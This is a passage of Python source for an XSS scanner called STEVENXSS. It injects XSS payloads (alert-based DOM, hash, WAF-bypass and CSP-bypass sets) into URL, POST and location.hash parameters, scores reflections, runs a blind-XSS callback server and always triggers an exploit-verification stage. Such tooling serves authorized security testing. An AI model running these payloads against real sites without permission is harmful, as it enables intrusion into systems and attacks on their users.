        DisplayManager.print_success(f"DOM analysis completed - Found {len(dom_analysis['vulnerabilities'])} potential issues")
        return dom_analysis
    
    async def _test_dom_payloads(self, page, url: str) -> List[Dict]:
        """Test DOM XSS payloads in various contexts"""
        vulnerabilities = []
        dom_payloads = self._generate_dom_payloads()
        
        for payload in dom_payloads:
            try:
                await page.goto(f"{url}#{payload}", wait_until="networkidle")
                
                test_results = await page.evaluate("""
                    (payload) => {
                        const results = {
                            hash_execution: false,
                            eval_context: false,
                            innerHTML_context: false,
                            event_handler: false,
                            url_manipulation: false
                        };

                        try {
                            if (location.hash && location.hash.includes(payload)) {
                                results.hash_execution = true;
                            }

                            try {
                                eval('var test = "' + payload + '"');
                                results.eval_context = true;
                            } catch(e) {}

                            const testDiv = document.createElement('div');
                            testDiv.innerHTML = payload;
                            if (testDiv.innerHTML.includes(payload)) {
                                results.innerHTML_context = true;
                            }

                            testDiv.setAttribute('onclick', payload);
                            if (testDiv.getAttribute('onclick') === payload) {
                                results.event_handler = true;
                            }

                        } catch (e) {
                            console.error('DOM test error:', e);
                        }

                        return results;
                    }
                """, payload)
                
                if any(test_results.values()):
                    vulnerability = {
                        'payload': payload,
                        'type': 'DOM_XSS',
                        'context': 'dom_manipulation',
                        'test_results': test_results,
                        'confidence': self._calculate_confidence(test_results)
                    }
                    vulnerabilities.append(vulnerability)
                    DisplayManager.print_warning(f"DOM XSS potential detected: {payload}")
                
            except Exception as e:
                logger.debug(f"DOM payload test failed for {payload}: {str(e)}")
        
        return vulnerabilities
    
    def _generate_dom_payloads(self) -> List[str]:
        """Generate DOM-specific XSS payloads"""
        return [
            "#<img src=x onerror=alert(1)>",
            "#javascript:alert(1)",
            "#'onclick=alert(1)//",
            "#\"onmouseover=alert(1)//",
            "#<script>alert(1)</script>",
            "#{alert(1)}",
            "#${alert(1)}",
            "#`${alert(1)}`",
            "#<svg onload=alert(1)>",
            "#<body onload=alert(1)>",
            "#<iframe src=javascript:alert(1)>"
        ]
    
    def _calculate_confidence(self, test_results: Dict) -> float:
        """Calculate confidence score for DOM XSS detection"""
        confidence = 0.0
        weights = {
            'eval_context': 0.3,
            'innerHTML_context': 0.25,
            'event_handler': 0.2,
            'hash_execution': 0.15,
            'url_manipulation': 0.1
        }
        
        for test, weight in weights.items():
            if test_results.get(test):
                confidence += weight
        
        return min(confidence * 100, 100.0)

class UltimatePayloadEngine:
    def __init__(self):
        self.payload_effectiveness: Dict[str, PayloadEffectiveness] = {}
        self.context_success_rates: Dict[ScanContext, float] = {}
        self.learning_enabled = True
        self.smart_categories = {}
        self.all_payloads = []
        self.waf_bypass_engine = WAFBypassEngine()
        self.blind_xss = BlindXSSIntegration()
    
    def load_all_payloads(self, file_path: str) -> List[str]:
        """Load ALL payloads from file without categorization"""
        DisplayManager.print_info(f"Loading ALL payloads from: {file_path}")
        all_payloads = []
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        all_payloads.append(line)
            
            self.all_payloads = all_payloads
            
            for payload in all_payloads:
                if payload not in self.payload_effectiveness:
                    self.payload_effectiveness[payload] = PayloadEffectiveness(payload=payload)
            
            DisplayManager.print_success(f"Loaded {len(all_payloads)} payloads from file")
            return all_payloads
            
        except Exception as e:
            DisplayManager.print_error(f"Error loading payloads: {str(e)}")
            return ["<script>alert('XSS')</script>"]
    
    def analyze_payload_file(self, file_path: str) -> Dict[str, List[str]]:
        """Analyze and categorize payloads from file"""
        DisplayManager.print_info(f"Analyzing payload file: {file_path}")
        
        categories = {
            'basic_script': [],
            'img_tags': [],
            'svg_payloads': [],
            'event_handlers': [],
            'javascript_urls': [],
            'data_urls': [],
            'encoding_bypass': [],
            'polyglot': [],
            'waf_bypass': [],
            'dom_based': [],
            'blind_xss': [],
            'location_hash': [],
            'csp_bypass': []
        }
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                current_category = 'basic_script'
                
                for line in f:
                    line = line.strip()
                    
                    if not line or line.startswith('#'):
                        if 'BASIC SCRIPT' in line:
                            current_category = 'basic_script'
                        elif 'IMG TAG' in line:
                            current_category = 'img_tags'
                        elif 'SVG' in line:
                            current_category = 'svg_payloads'
                        elif 'EVENT HANDLER' in line:
                            current_category = 'event_handlers'
                        elif 'JAVASCRIPT URL' in line:
                            current_category = 'javascript_urls'
                        elif 'DATA URL' in line:
                            current_category = 'data_urls'
                        elif 'ENCODING' in line:
                            current_category = 'encoding_bypass'
                        elif 'POLYGLOT' in line:
                            current_category = 'polyglot'
                        elif 'WAF' in line or 'BYPASS' in line:
                            current_category = 'waf_bypass'
                        elif 'DOM' in line:
                            current_category = 'dom_based'
                        elif 'BLIND' in line:
                            current_category = 'blind_xss'
                        elif 'LOCATION.HASH' in line or 'HASH' in line:
                            current_category = 'location_hash'
                        elif 'CSP' in line:
                            current_category = 'csp_bypass'
                        continue
                    
                    if line and not line.startswith('#'):
                        if current_category in categories:
                            categories[current_category].append(line)
                        else:
                            categories['basic_script'].append(line)
            
            # Add generated payloads for special categories
            categories['waf_bypass'].extend(self.waf_bypass_engine.generate_polyglot_payloads())
            categories['blind_xss'].extend(self.blind_xss.generate_blind_payloads())
            categories['csp_bypass'].extend(self.waf_bypass_engine.generate_csp_bypass_payloads())
            
            for category, payloads in categories.items():
                for payload in payloads:
                    if payload not in self.payload_effectiveness:
                        self.payload_effectiveness[payload] = PayloadEffectiveness(payload=payload)
            
            self.smart_categories = categories
            DisplayManager.print_success(f"Payload analysis complete: {sum(len(p) for p in categories.values())} payloads in {len(categories)} categories")
            
        except Exception as e:
            DisplayManager.print_error(f"Error analyzing payload file: {str(e)}")
            categories['basic_script'] = ["<script>alert('XSS')</script>"]
        
        return categories
    
    def get_smart_payloads(self, strategy: str = "comprehensive") -> List[str]:
        """Get payloads based on smart strategy"""
        strategies = {
            "quick": ['basic_script', 'img_tags', 'event_handlers'],
            "comprehensive": ['basic_script', 'img_tags', 'svg_payloads', 'event_handlers', 'javascript_urls', 'location_hash', 'csp_bypass'],
            "waf_bypass": ['encoding_bypass', 'polyglot', 'waf_bypass'],
            "dom_focused": ['dom_based', 'event_handlers', 'javascript_urls', 'location_hash'],
            "blind_xss": ['blind_xss', 'img_tags', 'svg_payloads'],
            "location_hash": ['location_hash', 'dom_based', 'event_handlers'],
            "csp_bypass": ['csp_bypass', 'waf_bypass', 'polyglot'],
            "all": []
        }
        
        if strategy == "all":
            return self.all_payloads if self.all_payloads else self._get_all_categorized_payloads()
        
        selected_categories = strategies.get(strategy, strategies["comprehensive"])
        payloads = []
        
        for category in selected_categories:
            payloads.extend(self.smart_categories.get(category, []))
        
        return list(set(payloads))
    
    def _get_all_categorized_payloads(self) -> List[str]:
        """Get all payloads from all categories"""
        all_payloads = []
        for category_payloads in self.smart_categories.values():
            all_payloads.extend(category_payloads)
        return list(set(all_payloads))
    
    def generate_context_specific_payloads(self, context: ScanContext) -> List[str]:
        """Generate payloads specific to injection context"""
        context_mapping = {
            ScanContext.HTML: ['basic_script', 'img_tags', 'svg_payloads'],
            ScanContext.ATTRIBUTE: ['event_handlers', 'encoding_bypass'],
            ScanContext.JAVASCRIPT: ['javascript_urls', 'encoding_bypass'],
            ScanContext.URL: ['javascript_urls', 'data_urls'],
            ScanContext.DOM: ['dom_based', 'event_handlers'],
            ScanContext.HASH: ['location_hash', 'dom_based', 'event_handlers']
        }
        
        categories = context_mapping.get(context, ['basic_script'])
        payloads = []
        
        for category in categories:
            payloads.extend(self.smart_categories.get(category, []))
        
        return payloads
    
    def update_effectiveness(self, payload: str, context: ScanContext, successful: bool):
        """Update payload effectiveness tracking"""
        if payload not in self.payload_effectiveness:
            self.payload_effectiveness[payload] = PayloadEffectiveness(payload=payload)
        
        effectiveness = self.payload_effectiveness[payload]
        effectiveness.total_tests += 1
        
        if successful:
            effectiveness.success_count += 1
            effectiveness.contexts.add(context)
        
        effectiveness._update_success_rate()
        
        if context not in self.context_success_rates:
            self.context_success_rates[context] = 0.0
        
    def get_most_effective_payloads(self, limit: int = 20) -> List[str]:
        """Get most effective payloads based on success rate"""
        effective_payloads = sorted(
            [p for p in self.payload_effectiveness.values() if p.total_tests > 0],
            key=lambda x: x.success_rate,
            reverse=True
        )
        return [p.payload for p in effective_payloads[:limit]]
    
    def get_successful_payloads_report(self) -> Dict[str, Any]:
        """Generate report of successful payloads"""
        successful_payloads = []
        for payload, effectiveness in self.payload_effectiveness.items():
            if effectiveness.success_count > 0:
                successful_payloads.append({
                    'payload': payload,
                    'success_count': effectiveness.success_count,
                    'total_tests': effectiveness.total_tests,
                    'success_rate': effectiveness.success_rate,
                    'contexts': [ctx.value for ctx in effectiveness.contexts]
                })
        
        successful_payloads.sort(key=lambda x: x['success_rate'], reverse=True)
        
        return {
            'total_successful': len(successful_payloads),
            'successful_payloads': successful_payloads,
            'total_tested': len([p for p in self.payload_effectiveness.values() if p.total_tests > 0]),
            'overall_success_rate': self._calculate_overall_success_rate()
        }
    
    def _calculate_overall_success_rate(self) -> float:
        """Calculate overall success rate"""
        total_tests = 0
        total_success = 0
        
        for effectiveness in self.payload_effectiveness.values():
            if effectiveness.total_tests > 0:
                total_tests += effectiveness.total_tests
                total_success += effectiveness.success_count
        
        if total_tests > 0:
            return (total_success / total_tests) * 100
        return 0.0

class AdvancedReflectionAnalyzer:
    def __init__(self):
        self.context_patterns = {
            ScanContext.HTML: [
                r'<[^>]*{}(?:[^>]*)?>',
                r'>[^<]*{}[^<]*<',
                r'<[^>]*>.*{}.*</[^>]*>'
            ],
            ScanContext.ATTRIBUTE: [
                r'\w+\s*=\s*["\'][^"\']*{}[^"\']*["\']',
                r'<[^>]*\s\w+\s*=\s*["\'][^"\']*{}[^\'"]*["\'][^>]*>'
            ],
            ScanContext.JAVASCRIPT: [
                r'<script[^>]*>[^<]*{}',
                r'javascript:[^"]*{}',
                r'on\w+\s*=\s*[^>]*{}',
                r'\b\w+\s*:\s*function[^{]*{}'
            ],
            ScanContext.URL: [
                r'https?://[^"\\s]*{}',
                r'[\'"]https?://[^\'"]*{}[^\'"]*[\'"]',
                r'window\.location[^;]*{}'
            ],
            ScanContext.HASH: [
                r'location\.hash[^=]*=[^=]*{}',
                r'window\.location\.hash[^=]*=[^=]*{}',
                r'#.*{}'
            ]
        }
    
    def analyze_reflection(self, response_text: str, payload: str) -> Dict[str, Any]:
        """Advanced reflection analysis with context detection"""
        analysis = {
            'exact_reflection': False,
            'partial_reflection': False,
            'contexts': [],
            'reflection_points': 0,
            'encoding_detected': False,
            'filter_attempts': False,
            'context_details': {},
            'confidence_score': 0.0
        }
        
        try:
            analysis['exact_reflection'] = payload in response_text
            analysis['reflection_points'] = response_text.count(payload)
            
            analysis['partial_reflection'] = self._check_partial_reflection(response_text, payload)
            
            analysis['contexts'] = self._detect_injection_context(response_text, payload)
            analysis['context_details'] = self._get_context_details(response_text, payload)
            
            analysis['encoding_detected'] = self._check_encoding(response_text, payload)
            analysis['filter_attempts'] = self._check_filter_attempts(response_text, payload)
            
            analysis['confidence_score'] = self._calculate_confidence(analysis)
            
        except Exception as e:
            logger.error(f"Reflection analysis error: {str(e)}")
            analysis['confidence_score'] = 0.0
        
        return analysis
    
    def _check_partial_reflection(self, response_text: str, payload: str) -> bool:
        """Check for partial payload reflection"""
        dangerous_patterns = [
            r'<[^>]*>',
            r'on\w+=',
            r'javascript:',
            r'&lt;',
            r'%3C'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def _detect_injection_context(self, response_text: str, payload: str) -> List[ScanContext]:
        """Detect injection context with pattern matching"""
        contexts = set()
        
        try:
            for context, patterns in self.context_patterns.items():
                for pattern in patterns:
                    escaped_payload = re.escape(payload)
                    formatted_pattern = pattern.format(escaped_payload)
                    if re.search(formatted_pattern, response_text, re.IGNORECASE | re.DOTALL):
                        contexts.add(context)
        except Exception as e:
            logger.debug(f"Context detection error: {str(e)}")
        
        return list(contexts) if contexts else [ScanContext.UNKNOWN]
    
    def _get_context_details(self, response_text: str, payload: str) -> Dict:
        """Get detailed context information"""
        details = {'positions': [], 'surrounding_text': []}
        
        try:
            start = 0
            while True:
                pos = response_text.find(payload, start)
                if pos == -1:
                    break
                details['positions'].append(pos)
                start = pos + 1
            
            for pos in details['positions'][:3]:
                start_pos = max(0, pos - 50)
                end_pos = min(len(response_text), pos + len(payload) + 50)
                context = response_text[start_pos:end_pos]
                details['surrounding_text'].append({
                    'position': pos,
                    'context': context,
                    'before': response_text[start_pos:pos],
                    'after': response_text[pos + len(payload):end_pos]
                })
        except Exception as e:
            logger.debug(f"Context details error: {str(e)}")
        
        return details
    
    def _check_encoding(self, response_text: str, payload: str) -> bool:
        """Check if payload is encoded in response"""
        try:
            encoded_variations = [
                html.escape(payload),
                urllib.parse.quote(payload),
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                payload.replace('"', '&quot;').replace("'", '&#x27;')
            ]
            
            return any(encoded in response_text for encoded in encoded_variations)
        except:
            return False
    
    def _check_filter_attempts(self, response_text: str, payload: str) -> bool:
        """Check if filtering was attempted"""
        filter_indicators = [
            'script', 'alert', 'onerror', 'javascript', 'eval', 'expression',
            'vbscript', 'data:', '&lt;script', '%3Cscript', 'document.write'
        ]
        
        return any(indicator in response_text.lower() for indicator in filter_indicators)
    
    def _calculate_confidence(self, analysis: Dict) -> float:
        """Calculate confidence score for vulnerability"""
        confidence = 0.0
        
        try:
            if analysis['exact_reflection']:
                confidence += 40
            
            if analysis['partial_reflection']:
                confidence += 20
            
            if analysis['reflection_points'] > 1:
                confidence += 10
            
            if not analysis['encoding_detected']:
                confidence += 20
            
            if analysis['contexts'] and ScanContext.UNKNOWN not in analysis['contexts']:
                confidence += 10
        except:
            confidence = 0.0
        
        return min(confidence, 100.0)

class STEVENXSSScanner:
    def __init__(self, max_concurrency: int = 50):
        self.max_concurrency = max_concurrency
        self.http_client = None
        self.payload_engine = UltimatePayloadEngine()
        self.reflection_analyzer = AdvancedReflectionAnalyzer()
        self.dom_analyzer = AdvancedDOMAnalyzer()
        self.exploit_engine = ExploitVerificationEngine()
        self.waf_bypass_engine = WAFBypassEngine()
        self.blind_xss = BlindXSSIntegration()
        
        self.results: List[ScanResult] = []
        self.stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'scan_start_time': None,
            'scan_end_time': None,
            'dom_vulnerabilities': 0,
            'current_test': 0,
            'total_tests': 0,
            'successful_tests': 0,
            'exploit_attempts': 0,
            'successful_exploits': 0,
            'location_hash_vulnerabilities': 0
        }
        self.successful_contexts: Set[ScanContext] = set()
        
    async def initialize(self):
        """Initialize the scanner"""
        try:
            self.http_client = AsyncHTTPClient(max_concurrency=self.max_concurrency)
            await self.http_client.__aenter__()
            self.stats['scan_start_time'] = time.time()
            return True
        except Exception as e:
            DisplayManager.print_error(f"Failed to initialize scanner: {str(e)}")
            return False
    
    async def close(self):
        """Close the scanner"""
        try:
            if self.http_client:
                await self.http_client.__aexit__(None, None, None)
            self.stats['scan_end_time'] = time.time()
        except Exception as e:
            logger.error(f"Error closing scanner: {str(e)}")
    
    def get_scan_duration(self) -> float:
        """Calculate scan duration safely"""
        if self.stats['scan_start_time'] is None:
            return 0.0
        if self.stats['scan_end_time'] is None:
            return time.time() - self.stats['scan_start_time']
        return self.stats['scan_end_time'] - self.stats['scan_start_time']
    
    def _extract_parameters(self, url: str, post_data: Dict = None) -> List[str]:
        """Extract parameters from URL and POST data - ENHANCED for location.hash"""
        parameters = []
        
        try:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            parameters.extend(query_params.keys())
            
            # Add 'location_hash' as a parameter if the URL contains a '#'
            if '#' in url:
                parameters.append('location_hash')
                DisplayManager.print_info("Location.hash parameter detected for testing")
            
            if post_data:
                parameters.extend(post_data.keys())
            
            return list(set(parameters))
        except Exception as e:
            logger.error(f"Error extracting parameters: {str(e)}")
            return []
    
    async def _test_parameter_payload(self, url: str, param: str, payload: str, 
                                    method: str = 'GET', post_data: Dict = None, 
                                    headers: Dict = None) -> Optional[ScanResult]:
        """Test a single parameter-payload combination - ENHANCED for location.hash"""
        try:
            self.stats['total_requests'] += 1
            self.stats['current_test'] += 1
            
            if self.stats['current_test'] % 10 == 0:
                DisplayManager.print_progress(
                    self.stats['current_test'], 
                    self.stats['total_tests'],
                    param,
                    payload
                )
            
            if param == 'location_hash':
                # Handle location.hash injection specially
                status, response_text, response_headers = await self._test_hash_payload(url, payload, headers)
            elif method.upper() == 'GET':
                status, response_text, response_headers = await self._test_get_payload(url, param, payload, headers)
            else:
                status, response_text, response_headers = await self._test_post_payload(url, param, payload, post_data, headers)
            
            reflection_analysis = self.reflection_analyzer.analyze_reflection(response_text, payload)
            
            vulnerability_level = self._assess_vulnerability_level(reflection_analysis)
            
            is_successful = vulnerability_level != VulnerabilityLevel.LOW
            context = reflection_analysis['contexts'][0] if reflection_analysis['contexts'] else ScanContext.UNKNOWN
            
            if param == 'location_hash' and is_successful:
                context = ScanContext.HASH
            
            if is_successful:
                self.payload_engine.update_effectiveness(payload, context, True)
                self.successful_contexts.add(context)
                self.stats['successful_tests'] += 1
                
                if param == 'location_hash':
                    self.stats['location_hash_vulnerabilities'] += 1
            else:
                self.payload_engine.update_effectiveness(payload, context, False)
            
            result = ScanResult(
                url=url,
                parameter=param,
                payload=payload,
                context=context,
                level=vulnerability_level,
                reflection_data=reflection_analysis,
                http_status=status,
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                confidence=reflection_analysis['confidence_score']
            )
            
            if is_successful:
                DisplayManager.print_vulnerability(result)
                return result
            else:
                return None
                
        except Exception as e:
            logger.debug(f"Error testing {param} with {payload}: {str(e)}")
            return None
    
    async def _test_hash_payload(self, url: str, payload: str, headers: Dict = None) -> tuple[int, str, Dict]:
        """Test payload in location.hash"""
        try:
            # Remove existing hash and inject payload
            base_url = url.split('#')[0]
            exploit_url = f"{base_url}#{payload}"
            
            DisplayManager.print_info(f"Testing location.hash with: {exploit_url}")
            
            return await self.http_client.get(exploit_url, headers)
        except Exception as e:
            logger.error(f"Hash payload test error: {str(e)}")
            return 0, str(e), {}
    
    async def _test_get_payload(self, url: str, param: str, payload: str, headers: Dict = None) -> tuple[int, str, Dict]:
        """Test payload in GET request"""
        try:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            if param in query_params:
                query_params[param] = [payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                target_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                return await self.http_client.get(target_url, headers)
            
            return 0, "", {}
        except Exception as e:
            logger.error(f"GET payload test error: {str(e)}")
            return 0, str(e), {}
    
    async def _test_post_payload(self, url: str, param: str, payload: str, post_data: Dict, headers: Dict = None) -> tuple[int, str, Dict]:
        """Test payload in POST request"""
        try:
            if post_data and param in post_data:
                test_data = post_data.copy()
                test_data[param] = payload
                return await self.http_client.post(url, test_data, headers)
            
            return 0, "", {}
        except Exception as e:
            logger.error(f"POST payload test error: {str(e)}")
            return 0, str(e), {}
    
    def _assess_vulnerability_level(self, analysis: Dict) -> VulnerabilityLevel:
        """Assess vulnerability level based on reflection analysis"""
        try:
            score = analysis['confidence_score']
            
            if score >= 80:
                return VulnerabilityLevel.CRITICAL
            elif score >= 60:
                return VulnerabilityLevel.HIGH
            elif score >= 40:
                return VulnerabilityLevel.MEDIUM
            else:
                return VulnerabilityLevel.LOW
        except:
            return VulnerabilityLevel.LOW
    
    async def _test_single_exploit(self, exploit_payload: str, successful_vulnerabilities: List[ScanResult], method: str, post_data: Dict):
        """Test a single exploit payload on all vulnerabilities"""
        for i, vuln in enumerate(successful_vulnerabilities, 1):
            DisplayManager.print_info(f"Testing exploit {i}/{len(successful_vulnerabilities)}: {vuln.parameter} with: {exploit_payload}")
            
            self.stats['exploit_attempts'] += 1
            
            # Handle location.hash exploits specially
            if vuln.parameter == 'location_hash':
                exploit_url = vuln.url.split('#')[0] + f"#{exploit_payload}"
                exploit_result = await self.exploit_engine.verify_exploit(
                    exploit_url, 'location_hash', exploit_payload, method, post_data
                )
            else:
                exploit_result = await self.exploit_engine.verify_exploit(
                    vuln.url, vuln.parameter, exploit_payload, method, post_data
                )
            
            vuln.exploit_result = exploit_result
            
            if exploit_result.successful:
                self.stats['successful_exploits'] += 1
                DisplayManager.print_exploit_success(f"Exploit successful for parameter: {vuln.parameter}")
                DisplayManager.print_exploit_success(f"Evidence: {exploit_result.evidence}")
                if exploit_result.screenshot_path:
                    DisplayManager.print_exploit_success(f"Screenshot saved: {exploit_result.screenshot_path}")
                return True  # Stop after first successful exploit
            else:
                DisplayManager.print_exploit_fail(f"Exploit failed for parameter: {vuln.parameter}")
                if exploit_result.error_message:
                    DisplayManager.print_exploit_fail(f"Error: {exploit_result.error_message}")
        
        return False
    
    async def perform_exploit_verification(self, exploit_payload: str = None, method: str = 'GET', post_data: Dict = None):
        """Perform exploit verification on confirmed vulnerabilities - ENHANCED with multiple payloads"""
        DisplayManager.print_section("EXPLOIT VERIFICATION")
        DisplayManager.print_warning("ETHICAL NOTICE: This feature is for authorized testing only!")
        DisplayManager.print_warning("Unauthorized use against systems without permission is illegal.")
        
        successful_vulnerabilities = [r for r in self.results if r.level in [VulnerabilityLevel.HIGH, VulnerabilityLevel.CRITICAL]]
        
        if not successful_vulnerabilities:
            DisplayManager.print_error("No high-confidence vulnerabilities found to exploit")
            return
        
        DisplayManager.print_info(f"Found {len(successful_vulnerabilities)} high-confidence vulnerabilities for exploit verification")
        
        # If no custom exploit payload provided, use the most successful payloads
        if not exploit_payload:
            successful_payloads = self.payload_engine.get_most_effective_payloads(limit=5)
            DisplayManager.print_info(f"Using top {len(successful_payloads)} successful payloads for exploitation")
            
            for payload in successful_payloads:
                DisplayManager.print_info(f"Testing with payload: {payload}")
                success = await self._test_single_exploit(payload, successful_vulnerabilities, method, post_data)
                if success:
                    break
            
            # If still no success, try CSP bypass payloads
            if self.stats['successful_exploits'] == 0:
                DisplayManager.print_info("No success with standard payloads. Trying CSP bypass payloads...")
                csp_payloads = self.waf_bypass_engine.generate_csp_bypass_payloads()[:5]
                for payload in csp_payloads:
                    DisplayManager.print_info(f"Testing with CSP bypass payload: {payload}")
                    success = await self._test_single_exploit(payload, successful_vulnerabilities, method, post_data)
                    if success:
                        break
        else:
            DisplayManager.print_info(f"Using custom exploit payload: {exploit_payload}")
            await self._test_single_exploit(exploit_payload, successful_vulnerabilities, method, post_data)
    
    async def smart_scan(self, target_url: str, payloads_file: str, 
                        strategy: str = "comprehensive", method: str = 'GET', 
                        post_data: Dict = None, custom_headers: Dict = None,
                        enable_dom: bool = True, max_tests: int = None,
                        use_all_payloads: bool = False, exploit_payload: str = None,
                        enable_blind_xss: bool = False) -> List[ScanResult]:
        """Perform smart XSS scanning with optional exploit verification"""
        
        DisplayManager.print_section("SMART SCAN INITIALIZATION")
        DisplayManager.print_info(f"Starting smart scan for {target_url}")
        DisplayManager.print_info(f"Strategy: {strategy}")
        DisplayManager.print_info(f"Use all payloads: {use_all_payloads}")
        DisplayManager.print_info(f"Enable Blind XSS: {enable_blind_xss}")
        
        # Start Blind XSS callback server if enabled
        if enable_blind_xss:
            DisplayManager.print_info("Starting Blind XSS callback server...")
            if not await self.blind_xss.start_server():
                DisplayManager.print_warning("Failed to start Blind XSS callback server, continuing without it...")
        
        if exploit_payload:
            DisplayManager.print_warning(f"Exploit mode activated with payload: {exploit_payload}")
        
        if use_all_payloads:
            smart_payloads = self.payload_engine.load_all_payloads(payloads_file)
        else:
            self.payload_engine.analyze_payload_file(payloads_file)
            smart_payloads = self.payload_engine.get_smart_payloads(strategy)
        
        if max_tests and len(smart_payloads) > max_tests:
            smart_payloads = smart_payloads[:max_tests]
            DisplayManager.print_info(f"Limited to {max_tests} payloads")
        
        DisplayManager.print_success(f"Selected {len(smart_payloads)} payloads for testing")
        
        parameters = self._extract_parameters(target_url, post_data)
        if not parameters:
            DisplayManager.print_warning("No parameters found for testing")
            return []
        
        DisplayManager.print_success(f"Found {len(parameters)} parameters to test")
        
        self.stats['total_tests'] = len(parameters) * len(smart_payloads)
        self.stats['current_test'] = 0
        
        DisplayManager.print_section("PAYLOAD TESTING")
        DisplayManager.print_info(f"Starting {self.stats['total_tests']} tests...")
        
        tasks = []
        for param in parameters:
            for payload in smart_payloads:
                task = self._test_parameter_payload(
                    target_url, param, payload, method, post_data, custom_headers
                )
                tasks.append(task)
        
        batch_size = min(self.max_concurrency, 50)  # Limit batch size for stability
        all_results = []
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]
            batch_results = await asyncio.gather(*batch, return_exceptions=True)
            
            # Filter out exceptions and keep only valid results
            for result in batch_results:
                if isinstance(result, Exception):
                    logger.debug(f"Task failed: {str(result)}")
                elif result is not None:
                    all_results.append(result)
        
        print()  # Clear progress line
        
        for result in all_results:
            if result:
                self.results.append(result)
                self.stats['vulnerabilities_found'] += 1
        
        if enable_dom:
            DisplayManager.print_section("DOM ANALYSIS")
            DisplayManager.print_info("Starting DOM XSS analysis...")
            try:
                dom_analysis = await self.dom_analyzer.analyze_dom_environment(target_url)
                
                for vuln in dom_analysis.get('vulnerabilities', []):
                    dom_result = ScanResult(
                        url=target_url,
                        parameter="DOM",
                        payload=vuln['payload'],
                        context=ScanContext.DOM,
                        level=VulnerabilityLevel.HIGH,
                        reflection_data={},
                        dom_analysis=vuln,
                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                        confidence=vuln.get('confidence', 70.0)
                    )
                    self.results.append(dom_result)
                    self.stats['vulnerabilities_found'] += 1
                    self.stats['dom_vulnerabilities'] += 1
            except Exception as e:
                DisplayManager.print_error(f"DOM analysis failed: {str(e)}")
        
        DisplayManager.print_success(f"Scan completed. Found {self.stats['vulnerabilities_found']} vulnerabilities")
        
        # Check for Blind XSS callbacks
        if enable_blind_xss and self.blind_xss.check_callback_detection():
            DisplayManager.print_success(f"Blind XSS callbacks detected: {len(self.blind_xss.detected_callbacks)}")
            for callback in self.blind_xss.detected_callbacks:
                DisplayManager.print_info(f"Callback from {callback['remote']}: {callback['data']}")
        
        # Perform exploit verification if requested
        if exploit_payload or True:  # Always try exploitation
            await self.perform_exploit_verification(exploit_payload, method, post_data)
        
        # Stop Blind XSS callback server if it was started
        if enable_blind_xss:
            await self.blind_xss.stop_server()
        
        return self.results
    
    def print_successful_payloads_report(self):
        """Print report of successful payloads"""
        successful_report = self.payload_engine.get_successful_payloads_report()
        
        DisplayManager.print_section("SUCCESSFUL PAYLOADS REPORT")
        
        if successful_report['total_successful'] > 0:
            DisplayManager.print_success(f"Total successful payloads: {successful_report['total_successful']}")
            DisplayManager.print_info(f"Overall success rate: {successful_report['overall_success_rate']:.2f}%")
            
            print(f"\n{TerminalColors.GREEN}{TerminalColors.BOLD}Top Successful Payloads:{TerminalColors.END}")
            for i, payload_info in enumerate(successful_report['successful_payloads'][:20], 1):
                print(f"{TerminalColors.GREEN}{i:2d}.{TerminalColors.END} {payload_info['payload']}")
                print(f"    {TerminalColors.CYAN}Success: {payload_info['success_count']}/{payload_info['total_tests']} ({payload_info['success_rate']:.1f}%){TerminalColors.END}")
                print(f"    {TerminalColors.YELLOW}Contexts: {', '.join(payload_info['contexts'])}{TerminalColors.END}\n")
        else:
            DisplayManager.print_warning("No successful payloads found in this scan")
    
    def generate_report(self, format: str = "html") -> str:
        """Generate comprehensive scan report"""
        DisplayManager.print_section("REPORT GENERATION")
        DisplayManager.print_info(f"Generating {format.upper()} report...")
        
        try:
            if format == "html":
                return self._generate_html_report()
            elif format == "json":
                return self._generate_json_report()
            elif format == "text":
                return self._generate_text_report()
            else:
                return self._generate_text_report()
        except Exception as e:
            DisplayManager.print_error(f"Report generation failed: {str(e)}")
            return f"Error generating report: {str(e)}"
    
    def _generate_html_report(self) -> str:
        """Generate interactive HTML report"""
        scan_duration = self.get_scan_duration()
        successful_report = self.payload_engine.get_successful_payloads_report()
        
        try:
            html_report = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STEVENXSS v2.4 - Security Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ text-align: center; border-bottom: 2px solid #333; padding-bottom: 20px; margin-bottom: 30px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; border-left: 4px solid #007bff; }}
        .vulnerability {{ border: 1px solid #ddd; margin: 15px 0; padding: 20px; border-radius: 8px; }}
        .critical {{ border-left: 4px solid #dc3545; background: #f8d7da; }}
        .high {{ border-left: 4px solid #fd7e14; background: #fff3cd; }}
        .medium {{ border-left: 4px solid #ffc107; background: #fefefe; }}
        .low {{ border-left: 4px solid #28a745; background: #f8f9fa; }}
        .payload {{ font-family: monospace; background: #f1f1f1; padding: 5px; border-radius: 3px; }}
        .context-badge {{ display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; margin: 2px; }}
        .html {{ background: #e3f2fd; color: #1565c0; }}
        .attribute {{ background: #f3e5f5; color: #7b1fa2; }}
        .javascript {{ background: #e8f5e8; color: #2e7d32; }}
        .dom {{ background: #fff3e0; color: #ef6c00; }}
